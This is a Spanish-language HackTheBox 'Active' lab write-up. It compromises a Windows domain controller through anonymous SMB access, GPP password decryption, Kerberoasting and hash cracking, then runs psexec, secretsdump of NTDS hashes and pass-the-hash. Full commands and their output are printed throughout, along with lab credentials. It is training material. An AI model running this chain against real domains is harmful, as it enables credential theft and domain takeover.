---
title: "HTB - Active"
platform: "[[HackTheBox]]"
os: "Windows"
tags:
  - Windows
  - Active-Directory
  - SMB-Enumeration
  - GPP-Password
  - Kerberoasting
  - AS-REP-Roasting
  - Group-Policy
  - DNS-Admin
  - Privilege-Escalation
image:
  path: /assets/images/posts/htb/active/active-banner.png
  alt: "HTB Active Banner"
toc: true
toc_label: "Contenido"
toc_sticky: true

---
# 📊 Resumen Ejecutivo
> Compromiso  del Domain Controller **Active** mediante enumeración SMB anónima, 
> explotación de Group Policy Preferences (GPP) para extraer credenciales de `SVC_TGS`,
> y escalada a Domain Admin mediante Kerberoasting al usuario `Administrator`.


## Machine Info
| Clave | Valor |
|-------|-------|
| **Nombre** | Active |
| **IP** | `10.129.29.159` |
| **OS** | Windows Server 2008 R2 SP1 (DC) |
| **Dominio** | `active.htb` |
| **Hostname** | DC |
| **Dificultad** | Easy |
| **Skills** | AD Enum, GPP, Kerberoasting, PtH, DCSync |
| **Fecha** | 2026-05-08 |
---

### Kill Chain

    A[Port Scan] -->|445 SMB| B[Anonymous Access]
    B -->|Replication Share| C[Groups.xml]
    C -->|gpp-decrypt| D[SVC_TGS Password]
    D -->|Kerberoasting| E[Administrator TGS]
    E -->|hashcat| F[Domain Admin]
    F -->|secretsdump| G[NTDS.dit Hashes]
    
    style G fill:#ff0000,color:#fff
    style A fill:#4a90d9,color:#fff


### Riesgos Identificados

|Riesgo|Impacto|Probabilidad|Severidad|
|---|---|---|---|
|SMB anónimo con acceso a shares sensibles|Crítico|Confirmado|🔴 CRÍTICA|
|Credenciales cifradas en GPP (Groups.xml)|Crítico|Confirmado|🔴 CRÍTICA|
|Domain Admin con SPN (Kerberoasteable)|Crítico|Confirmado|🔴 CRÍTICA|
|DC Windows 2008 R2 sin hardening|Alto|Confirmado|🟠 ALTA|
|NTDS.dit extraíble con credenciales DA|Crítico|Confirmado|🔴 CRÍTICA|

### Plan de Remediación

1. **Inmediato:** Deshabilitar SMB anonymous access
2. **Inmediato:** Eliminar `Groups.xml` y rotar contraseña de `SVC_TGS`
3. **Corto plazo:** Eliminar SPNs en cuenta `Administrator`
4. **Mediano plazo:** Actualizar Windows Server 2008 R2 (EOL)
5. **Largo plazo:** Implementar LAPS, tiering model, y auditoría AD

---

## Reconocimiento (Reconnaissance)

### Target Scoping

- **IP Objetivo:** `10.129.29.159`
- **Hostname Detectado:** `Active`
- **Sistema:** Windows Server 2008 R2 SP1 (Domain Controller)

### Escaneo de Puertos

#### Escaneo Inicial (Full Port Scan)
  
```bash

# Escaneo rápido de todos los puertos TCP
sudo nmap -p- --open -sS --min-rate=2000 -n -Pn -v $target -oN allServices

cat allPorts | awk '{print $1}' FS="/" | grep "^[0-9]" | tr '\n' ','

```

#### Servicios
```bash

nmap -p <Puerto> -sCV -v -N $target -oN allPorts
```

### Servicios Identificados

|Puerto|Servicio|Versión|Notas|
|---|---|---|---|
|53/tcp|DNS|Microsoft DNS 6.1.7601|DC típico|
|88/tcp|Kerberos|Windows Kerberos|Autenticación AD|
|135/tcp|MSRPC|Windows RPC||
|139/tcp|NetBIOS||Puerto NetBIOS|
|389/tcp|LDAP|AD (active.htb)|LDAP estándar|
|**445/tcp**|**SMB**||**Vector principal**|
|636/tcp|LDAPS||LDAP seguro|
|3268/tcp|LDAP GC||Global Catalog|
|3269/tcp|LDAPS GC||GC seguro|

`Microsoft DNS 6.1.7601` → **Windows Server 2008 R2 SP1** (EOL desde 2020)  
Domain: `active.htb`, Host: `DC`, Site: `Default-First-Site-Name`

## Enuemrando SMB

### Sincronización Horaria (Requisito Kerberos)
```bash

# Sincronizar reloj con el DC (obligatorio para Kerberos)
sudo ntpdate 10.129.29.159
```

### Kerbrute para enumerar usuarios sin credenciales **puerto 88 abierto**
antes recordar que el **horario** debe estar sincronizado con el **DC**
------>     `ntpdate 10.129.29.159`
```bash
ntpdate 10.129.29.159
kerbrute userenum --dc 10.129.29.159 -d active.htb /usr/share/seclists/Usernames/Names/names.txt 
```
### AS-REP Roasting para enumerar usuarios  sin credenciales

```bash
impacket-GetNPUsers active.htb/ -no-pass -usersfile user.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User SVC_TGS doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Aca tenemos el output que los usuarios **Administrator y SVC_TGS** existen pero orequieren **preauth**

Volver con date -s a la hora actual. (ver bien el comando)
### SMBClient
```bash
smbclient -L //10.129.29.159 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.29.159 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Tenemos permiso de lectura en el recurso **Replication** 
```bash
❯ smbmap -H 10.129.29.159 -u "" -p ""

[+] IP: 10.129.29.159:445	Name: 10.129.29.159       	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections                                                                                                     
```
luego estuve navegando y pude ver que contamos con Replication y eso nos lleva a la conclucion de como tiene un Windows 2008 Server y con la carpeta **Replication** , me da pensar que podemos probar **GPP**
Asi empece a enumerar hasta llegar a
```bash
  smbmap -H 10.129.29.159 -u "" -p "" -r 'Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/'
 
 smbmap -H 10.129.29.159 -u "" -p "" --download 'Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml'
 
 
cat 10.129.29.159-Replication_active.htb_Policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_MACHINE_Preferences_Groups_Groups.xml

───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="utf-8"?>
   2   │ <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA
       │ 1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-
       │ AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" 
       │ neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
   3   │ </Groups>

```

Al obtener las credenciales que Windows en su momento expuso podemos realizar la ruptura del hash aplicando **GPP**
```bash
❯ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

### Prueba de credenciales:
Al contar con credenciales validas:
```bash
smbmap -H 10.129.29.159 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r 'Users'

[+] IP: 10.129.29.159:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	./Users
```

Podemos solicitar un **TGT** mediante un ARS Proc attack.
Primero probamos: 
```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-05-07 19:52:54.604160             
```

Solicitango un **TGS**:
```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.29.159 -request

#OUTPUT


[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$23d5189bd2556ce3ad0c0e111b06218d$f9664b1ffaa60077c403de208aaf4d1aa47122ac213a96522462935c9741825efb582aced2825e9eeb1590a60be8665d10b09ad50883c4e3c0107191d9adccfb74f91972e73103e249ca44e06b3ccdfdd0fb86d0c928faecbcdaa5e92b62f80b0b729cf42c2d8868253bcddf3115897b8f7c552373d6c20a6c1e3edbdeb60611e3d13258c6f4d822511510411d3d0e1a44a94e1d0f9536ef86779910563430d67c63e7922106c2cf7442ea46f5aff293ce68a4c652f8da828370d352d0a2a2ef65da5c1efc1edaec1a4e175a2366ff36d5dc5ec246eae0ebdab5c4e3deeff452d1660dc2a69d7d0ee578eb44e8aeaeb70a8e616c259a306c93b7e780622075eb12b2fb3ee0d7dc79509695bbe9f310e15c282dbd94ebd68b8b63a35933d51d48d2f08969eab05cff19f56d29c33e45dc0a6eb5174425ae6750046021c7369d5569ca073f9668273adbbae4d9cc79d424b2877e99c11b10ba67bd504954dd62c48004364c6c41186bcfd5ceb49756bd2a414012a1a02d2a266591493ef2f984d175cd027b024e2c8f3f19883a71b0b585aaa0bb370ae5dd033a11e5444ec28c52dbee489de8daf9963413c0d2b203c2380536b40b1b5695331e1d0eef0e748f7d40b2f0bf362bd3ab6c722f8097b3e2b6c1bb175efb27997af380944b67f923193a948d176c8f77e072dcebce862ce5c0db8a9a9401bfaf0691731cbb5d37364d72397705ecfdfcc47c879a48472e50bb0b2eae24073380f6787c203ea4b91df241099ea83487de7d4c9d22abe4c683139b874e185f01898bc51bed263deda1dc53f6bc8b7682b8da9a424419748b5956c8dce8e6a6dfb4b427a21fdf74f03bf6b2d887ed736a4e582fe5c8a093b9f186250cef1272f92cc2dca8d678b222a90ab35779867f1727a91657dab6c1937d456f45c00555ab5e596e37c25fb151ddc34680f0e4fc131fb64f4151c018175e21982fd80d2a25169c22df62db6f00aa3cd0eeeeb339348820cff87767e686d8c367d3df0a6d65b80e323ec825820726df57ba7824e1d6143402148cf0ff48c2040eac459f80d2cee3608b0ca4cc3d5a8702deaaaf4fa0146417ec1592546ab26de4eac5adba25202fd4ca2353dc40438eab71c167d36af1372cf82f2df349540a03f4bd67c25f103a68660f506713d08e5c9642564dd3d5a2b3d32ead9cb5557c3ee07e47c2a3202fbb80fd251150f840244c1cede9037975d8e39d2a4da8df82b6f7bd8fb46ecec3114f

```

### Crackeando con John el TGS obtenido
Procedemos a guardar en una rchivo llamado **hash** el contenido del TGS e intentar romperlo con john
```bash
echo "$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$23d5189bd2556ce3ad0c0e111b06218d$f9664b1ffaa60077c403de208aaf4d1aa47122ac213a96522462935c9741825efb582aced2825e9eeb1590a60be8665d10b09ad50883c4e3c0107191d9adccfb74f91972e73103e249ca44e06b3ccdfdd0fb86d0c928faecbcdaa5e92b62f80b0b729cf42c2d8868253bcddf3115897b8f7c552373d6c20a6c1e3edbdeb60611e3d13258c6f4d822511510411d3d0e1a44a94e1d0f9536ef86779910563430d67c63e7922106c2cf7442ea46f5aff293ce68a4c652f8da828370d352d0a2a2ef65da5c1efc1edaec1a4e175a2366ff36d5dc5ec246eae0ebdab5c4e3deeff452d1660dc2a69d7d0ee578eb44e8aeaeb70a8e616c259a306c93b7e780622075eb12b2fb3ee0d7dc79509695bbe9f310e15c282dbd94ebd68b8b63a35933d51d48d2f08969eab05cff19f56d29c33e45dc0a6eb5174425ae6750046021c7369d5569ca073f9668273adbbae4d9cc79d424b2877e99c11b10ba67bd504954dd62c48004364c6c41186bcfd5ceb49756bd2a414012a1a02d2a266591493ef2f984d175cd027b024e2c8f3f19883a71b0b585aaa0bb370ae5dd033a11e5444ec28c52dbee489de8daf9963413c0d2b203c2380536b40b1b5695331e1d0eef0e748f7d40b2f0bf362bd3ab6c722f8097b3e2b6c1bb175efb27997af380944b67f923193a948d176c8f77e072dcebce862ce5c0db8a9a9401bfaf0691731cbb5d37364d72397705ecfdfcc47c879a48472e50bb0b2eae24073380f6787c203ea4b91df241099ea83487de7d4c9d22abe4c683139b874e185f01898bc51bed263deda1dc53f6bc8b7682b8da9a424419748b5956c8dce8e6a6dfb4b427a21fdf74f03bf6b2d887ed736a4e582fe5c8a093b9f186250cef1272f92cc2dca8d678b222a90ab35779867f1727a91657dab6c1937d456f45c00555ab5e596e37c25fb151ddc34680f0e4fc131fb64f4151c018175e21982fd80d2a25169c22df62db6f00aa3cd0eeeeb339348820cff87767e686d8c367d3df0a6d65b80e323ec825820726df57ba7824e1d6143402148cf0ff48c2040eac459f80d2cee3608b0ca4cc3d5a8702deaaaf4fa0146417ec1592546ab26de4eac5adba25202fd4ca2353dc40438eab71c167d36af1372cf82f2df349540a03f4bd67c25f103a68660f506713d08e5c9642564dd3d5a2b3d32ead9cb5557c3ee07e47c2a3202fbb80fd251150f840244c1cede9037975d8e39d2a4da8df82b6f7bd8fb46ecec3114f" > hash.txt
```

#### John y hashcat
```bash
❯ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:03 DONE (2026-05-08 15:50) 0.2673g/s 2817Kp/s 2817Kc/s 2817KC/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```bash
1- hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt -o resultado_hash.txt --force
2- ❯ hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$23d5189bd2556ce3ad0c0e111b06218d$f9664b1ffaa60077c403de208aaf4d1aa47122ac213a96522462935c9741825efb582aced2825e9eeb1590a60be8665d10b09ad50883c4e3c0107191d9adccfb74f91972e73103e249ca44e06b3ccdfdd0fb86d0c928faecbcdaa5e92b62f80b0b729cf42c2d8868253bcddf3115897b8f7c552373d6c20a6c1e3edbdeb60611e3d13258c6f4d822511510411d3d0e1a44a94e1d0f9536ef86779910563430d67c63e7922106c2cf7442ea46f5aff293ce68a4c652f8da828370d352d0a2a2ef65da5c1efc1edaec1a4e175a2366ff36d5dc5ec246eae0ebdab5c4e3deeff452d1660dc2a69d7d0ee578eb44e8aeaeb70a8e616c259a306c93b7e780622075eb12b2fb3ee0d7dc79509695bbe9f310e15c282dbd94ebd68b8b63a35933d51d48d2f08969eab05cff19f56d29c33e45dc0a6eb5174425ae6750046021c7369d5569ca073f9668273adbbae4d9cc79d424b2877e99c11b10ba67bd504954dd62c48004364c6c41186bcfd5ceb49756bd2a414012a1a02d2a266591493ef2f984d175cd027b024e2c8f3f19883a71b0b585aaa0bb370ae5dd033a11e5444ec28c52dbee489de8daf9963413c0d2b203c2380536b40b1b5695331e1d0eef0e748f7d40b2f0bf362bd3ab6c722f8097b3e2b6c1bb175efb27997af380944b67f923193a948d176c8f77e072dcebce862ce5c0db8a9a9401bfaf0691731cbb5d37364d72397705ecfdfcc47c879a48472e50bb0b2eae24073380f6787c203ea4b91df241099ea83487de7d4c9d22abe4c683139b874e185f01898bc51bed263deda1dc53f6bc8b7682b8da9a424419748b5956c8dce8e6a6dfb4b427a21fdf74f03bf6b2d887ed736a4e582fe5c8a093b9f186250cef1272f92cc2dca8d678b222a90ab35779867f1727a91657dab6c1937d456f45c00555ab5e596e37c25fb151ddc34680f0e4fc131fb64f4151c018175e21982fd80d2a25169c22df62db6f00aa3cd0eeeeb339348820cff87767e686d8c367d3df0a6d65b80e323ec825820726df57ba7824e1d6143402148cf0ff48c2040eac459f80d2cee3608b0ca4cc3d5a8702deaaaf4fa0146417ec1592546ab26de4eac5adba25202fd4ca2353dc40438eab71c167d36af1372cf82f2df349540a03f4bd67c25f103a68660f506713d08e5c9642564dd3d5a2b3d32ead9cb5557c3ee07e47c2a3202fbb80fd251150f840244c1cede9037975d8e39d2a4da8df82b6f7bd8fb46ecec3114f:Ticketmaster1968
```

### Validando credenciales Administrator
```bash
❯ nxc smb 10.129.29.159 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.129.29.159   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.29.159   445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

### Obteniendo acceso al sistema con **impacket**
```bash
❯ impacket-psexec activate.htb/Administrator:'Ticketmaster1968'@10.129.29.159
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.29.159.....
[*] Found writable share ADMIN$
[*] Uploading file nnBRwXhP.exe
[*] Opening SVCManager on 10.129.29.159.....
[*] Creating service uJCv on 10.129.29.159.....
[*] Starting service uJCv.....
[!] Press help for extra shell commands                                                                                                                                                                                                 Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 

# Dentro de la shell de impacket
type "C:\Users\SVC_TGS\Desktop\user.txt"
type "C:\Users\Administrator\Desktop\root.txt"
```


### Obteniendo hashes NTDS
#### ¿Qué es `secretsdump`?
`secretsdump` es una herramienta de `impacket` que **extrae los hashes de contraseñas** almacenados en el Controlador de Dominio. 
```bash
# Desde tu máquina atacante, con las credenciales de Administrator
impacket-secretsdump active.htb/Administrator:'Ticketmaster1968'@10.129.29.159
```

```bash
# OUTPUT

[*] Target system bootKey: 0xff954ee81ffb63937b563f523caf1d59
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ACTIVE\DC$:aes256-cts-hmac-sha1-96:e3807e7cf7ba505ad87e1e904ec27aa7cf634a4d535a994e5ba6a84301f50ad3
ACTIVE\DC$:aes128-cts-hmac-sha1-96:6081f8e0730f73229585d0854c06198a
ACTIVE\DC$:des-cbc-md5:801a929220497564
ACTIVE\DC$:plain_password_hex:6cbff107d1bf19bcd4fa564932e86ca2843e25ad9b036aa0abb15324ebf31ae307a48585cc6a3abb1a3a53c4efb0cb1b3b84209f2fab517952ab8a27793ddfe2c7d502f8c3d4467cf193c116d7ad2551741d18f8a3da66b54091728a2f6800b02542c4a049d1c7bd484d7d95ccdd950f0d4fcf983c5259c9cbf1df65836f6087b3fb5bbf14cc3842df9b915e1f2dfa39024ba6b573fdc828202920dc34999f6e211fa1acf5ce67bcd9b344c8c51244a00cd8d3e3decc504e1ce3e00310f54d766c1e3b5b05917590119d8d09ab9eefe673df824d1481ee93da6e1aa33018dd9cc3e8d9a866a22ac0dca59abacf9409ea
ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:a34df8c83772da39f09e0de7543eadc0:::
[*] DefaultPassword 
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x377bd35be67705f345dabf00d3181e269e0fb1e6
dpapi_userkey:0x7586c391e559565c85cb342d1d24546381f0d5cb
[*] NL$KM 
 0000   CC 6F B8 46 C3 0C 58 05  2F F2 07 2E DA E6 BF 7D   .o.F..X./......}
 0010   60 63 F6 89 E7 0E D5 D5  22 EE 54 DA 63 12 5B B5   `c......".T.c.[.
 0020   D8 DA 0B B7 82 0E 3D E1  9D 7A 03 15 08 5C B0 AE   ......=..z...\..
 0030   EF 63 91 B9 6C 87 65 A8  14 62 95 BC 77 69 77 08   .c..l.e..b..wiw.
NL$KM:cc6fb846c30c58052ff2072edae6bf7d6063f689e70ed5d522ee54da63125bb5d8da0bb7820e3de19d7a0315085cb0aeef6391b96c8765a8146295bc77697708
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:a34df8c83772da39f09e0de7543eadc0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
Administrator:des-cbc-md5:5891549b31f2c294
krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
krbtgt:des-cbc-md5:9d044f891adf7629
active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
DC$:aes256-cts-hmac-sha1-96:e3807e7cf7ba505ad87e1e904ec27aa7cf634a4d535a994e5ba6a84301f50ad3
DC$:aes128-cts-hmac-sha1-96:6081f8e0730f73229585d0854c06198a
DC$:des-cbc-md5:70b0cbe69e37a2fe
[*] Cleaning up... 
```

El hash de Administrator que nos interesa es:
```bash

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
```
- **LM Hash:** `aad3b435b51404eeaad3b435b51404ee` (vacío, normal en sistemas modernos)
- **NTLM Hash:** `5ffb4aaaf9b63dc519eca04aec0e8bed` → **Este es el que usaremos**



#### 1. Movimiento lateral (Pass-the-Hash) autenticación NTLM

Con el hash de `Administrator`, puedes conectarte a cualquier máquina del dominio **sin saber la contraseña en texto plano**:
Opcion 1:
```bash

impacket-psexec -hashes :[hash_ntlm_del_admin] active.htb/Administrator@ip_objetivo

❯ impacket-psexec -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed active.htb/Administrator@10.129.29.159
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.29.159.....
[*] Found writable share ADMIN$
[*] Uploading file AyUwBIel.exe
[*] Opening SVCManager on 10.129.29.159.....
[*] Creating service qtRD on 10.129.29.159.....
[*] Starting service qtRD.....
[!] Press help for extra shell commands                                                                        Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> 


```

Opcion 2:
```bash
nxc smb 10.129.29.159 -u 'Administrator' -H '5ffb4aaaf9b63dc519eca04aec0e8bed'
```

Opcion 3:
```bash
impacket-wmiexec -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed active.htb/Administrator@10.129.29.159
```

### 4. Cracking offline (si quieres contraseñas en texto plano)
Los hashes pueden crackearse con `hashcat` o `john` para obtener las contraseñas en texto plano, lo que permite:

- Acceso a otros servicios (VPN, correo, etc.)
- Reutilización de contraseñas en otros sistemas